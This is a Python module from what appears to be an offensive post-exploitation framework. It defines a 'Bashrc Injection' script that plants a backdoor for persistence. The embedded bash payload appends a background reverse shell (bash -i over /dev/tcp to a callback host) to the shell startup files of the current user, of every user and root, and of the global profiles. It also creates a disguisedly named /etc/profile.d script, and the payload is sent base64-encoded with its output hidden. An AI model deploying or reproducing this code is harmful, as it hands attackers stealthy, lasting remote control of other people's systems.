"""Bashrc injection script."""

from ..base import OperatorScript, ScriptResult


class BashrcInjection(OperatorScript):
    """Inject backdoor into bashrc/profile for persistence."""
    
    name = "Bashrc Injection"
    description = "Inject backdoor into shell initialization files"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] BASHRC/PROFILE INJECTION"
echo "============================"
echo ""

CALLBACK="${CALLBACK_HOST:-192.168.1.100:4444}"

PAYLOAD="(bash -i >& /dev/tcp/${CALLBACK//:/ } 0>&1 &) 2>/dev/null"

echo "[+] Injecting into current user's shell configs..."
for rc in ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc; do
    if [ -f "$rc" ]; then
        echo "$PAYLOAD" >> "$rc" 2>/dev/null && \
            echo "[+] Injected into: $rc" || \
            echo "[-] Could not modify: $rc"
    fi
done

echo ""
echo "[+] Injecting into all users' shell configs..."
for user_home in /home/* /root; do
    if [ -d "$user_home" ]; then
        username=$(basename "$user_home")
        for rc in .bashrc .bash_profile .profile .zshrc; do
            rcfile="$user_home/$rc"
            if [ -f "$rcfile" ]; then
                echo "$PAYLOAD" >> "$rcfile" 2>/dev/null && \
                    echo "[+] Injected into: $rcfile" || \
                    echo "[-] No access to: $rcfile"
            fi
        done
    fi
done

echo ""
echo "[+] Injecting into global profile..."
for global_rc in /etc/profile /etc/bash.bashrc /etc/zshrc; do
    if [ -f "$global_rc" ]; then
        echo "$PAYLOAD" >> "$global_rc" 2>/dev/null && \
            echo "[+] Injected into: $global_rc" || \
            echo "[-] Could not modify: $global_rc (need root)"
    fi
done

echo ""
echo "[+] Injecting into profile.d scripts..."
PROFILED_SCRIPT="/etc/profile.d/00-update.sh"
cat > "$PROFILED_SCRIPT" 2>/dev/null <<EOF
#!/bin/bash
$PAYLOAD
EOF

if [ -f "$PROFILED_SCRIPT" ]; then
    chmod +x "$PROFILED_SCRIPT" 2>/dev/null
    echo "[+] Created: $PROFILED_SCRIPT"
else
    echo "[-] Could not create profile.d script"
fi

echo ""
echo "[+] Stealth techniques:"
echo "  - Payload runs in background with stderr redirected"
echo "  - No visible output to user"
echo "  - Triggers on every shell login"

echo ""
echo "[+] Verifying injections:"
grep -r "bash -i" ~/.bashrc ~/.profile /etc/profile /etc/bash.bashrc 2>/dev/null | wc -l | \
    xargs echo "[*] Found backdoors in files:"

echo ""
echo "[+] Persistence installed!"
echo "    Triggers: On every shell login"
echo "    Callback: $CALLBACK"
echo "    Target users: All users + root"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Injecting into shell configs...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Bashrc injection executed",
                metadata={"script": "bashrc_injection"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
